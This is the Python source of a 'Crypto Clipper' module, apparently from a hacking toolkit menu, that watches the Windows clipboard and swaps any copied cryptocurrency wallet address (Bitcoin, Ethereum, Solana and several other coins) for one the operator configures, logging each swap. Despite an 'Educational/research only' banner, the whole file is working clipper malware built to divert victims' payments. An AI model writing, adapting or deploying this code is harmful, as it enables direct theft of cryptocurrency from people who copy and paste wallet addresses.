"""Crypto Clipper — Cryptocurrency address clipboard monitor and swapper."""

import os
import sys
import time
import re
import threading

try:
    from kevbin import clear, cprint, prompt, pause
except ImportError:
    def clear():
        os.system('cls' if os.name == 'nt' else 'clear')
    def cprint(*a, **kw):
        msg = ' '.join(str(x) for x in a if isinstance(x, str))
        sys.stdout.write(msg + '\n'); sys.stdout.flush()
    def prompt(msg=''):
        if msg: sys.stdout.write(msg); sys.stdout.flush()
        return input()
    def pause():
        prompt('\n  \033[90mPress Enter to continue...\033[0m'); input()

WALLET_PATTERNS = {
    'BTC': re.compile(r'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$|^bc1[a-zA-HJ-NP-Z0-9]{25,90}$'),
    'ETH': re.compile(r'^0x[a-fA-F0-9]{40}$'),
    'LTC': re.compile(r'^[LM][a-km-zA-HJ-NP-Z1-9]{26,34}$'),
    'XRP': re.compile(r'^r[1-9A-HJ-NP-Za-km-z]{24,34}$'),
    'DOGE': re.compile(r'^D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}$'),
    'SOL': re.compile(r'^[1-9A-HJ-NP-Za-km-z]{32,44}$'),
    'DASH': re.compile(r'^X[a-km-zA-HJ-NP-Z1-9]{33}$'),
    'BCH': re.compile(r'^bitcoincash:q[a-z0-9]{41}$|^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$'),
}

clip_log = []
clip_lock = threading.Lock()

def _detect_wallet(text):
    text = text.strip()
    for coin, pattern in WALLET_PATTERNS.items():
        if pattern.match(text):
            return coin
    return None

def _get_clipboard():
    try:
        import subprocess
        result = subprocess.run(['powershell', '-NoProfile', '-Command', 'Get-Clipboard'],
                                capture_output=True, text=True, timeout=5)
        return result.stdout.strip()
    except:
        return ""

def _set_clipboard(text):
    try:
        import subprocess
        subprocess.run(['powershell', '-NoProfile', '-Command', f'Set-Clipboard -Value "{text}"'],
                       capture_output=True, timeout=5)
        return True
    except:
        return False

def _monitor(replacements, stop_flag, notify):
    last = ""
    while not stop_flag.is_set():
        try:
            current = _get_clipboard()
            if current and current != last:
                last = current
                for coin, addr in replacements.items():
                    if addr and current != addr:
                        detected = _detect_wallet(current)
                        if detected:
                            _set_clipboard(addr)
                            with clip_lock:
                                clip_log.append({
                                    "time": time.strftime('%H:%M:%S'),
                                    "original": current[:40],
                                    "replaced_with": addr[:40],
                                    "coin": detected,
                                })
                            if notify:
                                sys.stdout.write(f"\r  \033[92m[CLIP]\033[0m {detected} swapped: {current[:20]}... -> {addr[:20]}...\n")
                                sys.stdout.flush()
                            break
        except Exception:
            pass
        time.sleep(0.3)

def run(kevbin=None):
    replacements = {c: "" for c in WALLET_PATTERNS}
    while True:
        clear()
        cprint("  \033[93m\u2554" + "\u2550"*44 + "\u2557")
        cprint("  \033[93m\u2551       CRYPTO CLIPPER                      \u2551")
        cprint("  \033[93m\u255a" + "\u2550"*44 + "\u255d")
        cprint("  \033[91m[!] Educational/research only\033[0m")
        print()
        cprint("  \033[97m[1]  Configure Replacement Addresses\033[0m")
        cprint("  \033[97m[2]  Start Clip Monitor\033[0m")
        cprint("  \033[97m[3]  View Swap Log\033[0m")
        cprint("  \033[97m[4]  Test Wallet Detection\033[0m")
        cprint("  \033[91m[0]  Back\033[0m")
        print()
        configured = sum(1 for v in replacements.values() if v)
        if configured:
            cprint(f"  \033[90m  {configured}/{len(replacements)} coins configured\033[0m")
        print()
        choice = prompt("\033[33m  choice > \033[0m")
        if choice == '0':
            return
        elif choice == '1':
            clear()
            cprint("  \033[93m┌── CONFIGURE ADDRESSES ─────────────────────┐\033[0m")
            cprint("  \033[90mEnter your replacement address for each coin (empty to skip):\033[0m\n")
            for coin in WALLET_PATTERNS:
                current = replacements[coin]
                marker = f"\033[92m(current: {current[:20]}...)\033[0m" if current else "\033[90m(not set)\033[0m"
                addr = prompt(f"  \033[96m{coin}: \033[0m{marker} > ").strip()
                if addr:
                    replacements[coin] = addr
                    cprint(f"  \033[92m  [X] Set {coin} replacement\033[0m")
        elif choice == '2':
            if not any(replacements.values()):
                cprint("  \033[91m[X] Configure addresses first\033[0m"); pause(); continue
            clear()
            cprint("  \033[93m┌── CLIP MONITOR ────────────────────────────┐\033[0m")
            cprint("  \033[92m[*] Monitoring clipboard... Press Ctrl+C to stop\033[0m\n")
            stop = threading.Event()
            t = threading.Thread(target=_monitor, args=(replacements, stop, True), daemon=True)
            t.start()
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                stop.set()
                time.sleep(0.5)
        elif choice == '3':
            clear()
            cprint("  \033[93m┌── SWAP LOG ────────────────────────────────┐\033[0m")
            with clip_lock:
                if not clip_log:
                    cprint("  \033[90mNo swaps recorded\033[0m")
                else:
                    for e in clip_log:
                        cprint(f"  \033[90m{e['time']}\033[0m \033[92m{e['coin']}\033[0m {e['original']}... -> {e['replaced_with']}...")
                    cprint(f"\n  \033[97mTotal: {len(clip_log)} swap(s)\033[0m")
        elif choice == '4':
            clear()
            cprint("  \033[93m┌── WALLET DETECTION TEST ───────────────────┐\033[0m")
            addr = prompt("  \033[96mPaste an address: \033[0m").strip()
            detected = _detect_wallet(addr)
            if detected:
                cprint(f"  \033[92m[X] Detected: {detected}\033[0m")
            else:
                cprint("  \033[93m[X] Not recognized as a known wallet format\033[0m")
        else:
            cprint("  \033[91mInvalid choice\033[0m")
            time.sleep(0.5)
        pause()
